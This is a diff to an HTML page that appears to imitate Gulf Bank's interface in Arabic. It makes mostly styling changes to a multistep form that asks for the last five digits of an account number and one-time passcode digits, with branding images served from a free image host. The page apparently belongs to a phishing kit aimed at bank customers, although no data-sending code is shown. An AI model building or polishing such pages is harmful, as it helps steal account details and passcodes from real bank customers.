@@ -25,9 +25,11 @@
       background: #fff;
     }
     .logo {
-      width: 180px;
-      margin: 0 auto 24px;
+      width: 300px; /* تم التكبير */
+      max-width: 80vw;
+      margin: 0 auto 32px;
       display: block;
+      transition: width 0.2s;
     }
     .header-text {
       font-size: 1.5rem;
@@ -91,31 +93,42 @@
       margin: 0 2px;
       cursor: pointer;
     }
+    /* === Footer Banner Full Image === */
     .footer-nav {
       position: fixed;
       bottom: 0;
+      left: 0;
       width: 100vw;
-      background: linear-gradient(0deg, #b80000 0%, #f43333 100%);
+      height: 74px;
+      background: none;
+      padding: 0;
+      border-radius: 0;
+      box-shadow: none;
+      z-index: 10;
       display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 7px 0 7px 0;
-      border-radius: 24px 24px 0 0;
-      box-shadow: 0 -1px 12px #0002;
-      z-index: 10;
-      min-height: 56px;
+      align-items: stretch;
+      min-height: unset;
     }
-    .footer-nav-img {
-      height: 40px;
-      width: auto;
+    .footer-banner-img {
+      width: 100vw;
+      height: 100%;
+      object-fit: cover;
       display: block;
-      margin: 0 auto;
-      border-radius: 12px;
-      box-shadow: 0 2px 10px #9112;
+      margin: 0;
+      border-radius: 0;
+      box-shadow: none;
+      padding: 0;
+      min-height: 74px;
+      max-height: 25vh;
       background: #fff;
-      padding: 6px 30px 6px 30px;
-      object-fit: contain;
     }
+    @media (max-width: 500px) {
+      .logo { width: 70vw; }
+      .footer-nav { height: 48px; }
+      .footer-banner-img { min-height: 48px; max-height: 19vw; }
+    }
+
     /* Special styles for steps */
     .step {
       display: none;
@@ -133,11 +146,23 @@
       margin: 18px auto 0 auto;
       display: block;
     }
+    /* ======== Account Step Adjustments ======== */
+    .account-step-arrow {
+      width: 32px;
+      height: 32px;
+      margin-left: 10px;
+      margin-bottom: -8px;
+      vertical-align: middle;
+      display: inline-block;
+      transform: scaleX(-1); /* للسهم من اليسار لليمين */
+    }
     .account-inputs {
       display: flex;
+      flex-direction: row;
       gap: 15px;
       margin: 20px auto 0 auto;
       justify-content: center;
+      direction: ltr; /* مهم لترتيب الحقول من اليسار لليمين */
     }
     .account-digit {
       width: 60px;
@@ -151,6 +176,8 @@
       margin: 0 2px;
       outline: none;
       transition: border 0.2s;
+      direction: ltr;
+      unicode-bidi: plaintext;
     }
     .account-digit:focus {
       border: 2px solid #d00;
@@ -232,11 +259,10 @@
       .header-text { font-size: 1.2rem; }
       .sub-header { font-size: 1.05rem; }
       .main-btn, .main-btn:disabled, .form-group, .input { max-width: 98vw; }
-      .footer-nav { font-size: 0.92em; min-height: 46px; }
-      .footer-nav-img { padding: 6px 10vw 6px 10vw; height: 32px; }
       .account-digit, .otp-digit { width: 44px; height: 44px; font-size: 1.3em; }
       .card-img { width: 75px; }
       .sms-icon { width: 38px; }
+      .account-step-arrow { width: 22px; height: 22px; }
     }
     /* Custom improvements for OTP step */
     .otp-step-header {
@@ -320,7 +346,10 @@
     </div>
     <!-- Step 4: Account Number -->
     <div class="step" id="step-account">
-      <div class="header-text" style="margin-top:60px;">رقم حسابك</div>
+      <div class="header-text" style="margin-top:60px;">
+        <span>رقم حسابك</span>
+        <img src="https://cdn-icons-png.flaticon.com/128/271/271228.png" class="account-step-arrow" alt="من اليسار لليمين">
+      </div>
       <div class="sub-header" style="font-size:1.07em;">ادخل آخر 5 أرقام لأي من حساباتك لدى بنك الخليج</div>
       <form id="account-form" autocomplete="off" style="width:100%;">
         <div class="account-inputs">
@@ -366,9 +395,9 @@
       <button onclick="closeErrorPopup()">موافق</button>
     </div>
   </div>
-  <!-- Footer navigation with custom image -->
+  <!-- ===== Footer banner image only ===== -->
   <div class="footer-nav">
-    <img class="footer-nav-img" src="https://www2.0zz0.com/2025/09/29/02/343527258.jpeg" alt="المنتجات والمساعدة بنك الخليج">
+    <img class="footer-banner-img" src="https://www2.0zz0.com/2025/09/29/02/343527258.jpeg" alt="المنتجات والمساعدة بنك الخليج">
   </div>
   <script>
     // Step navigation
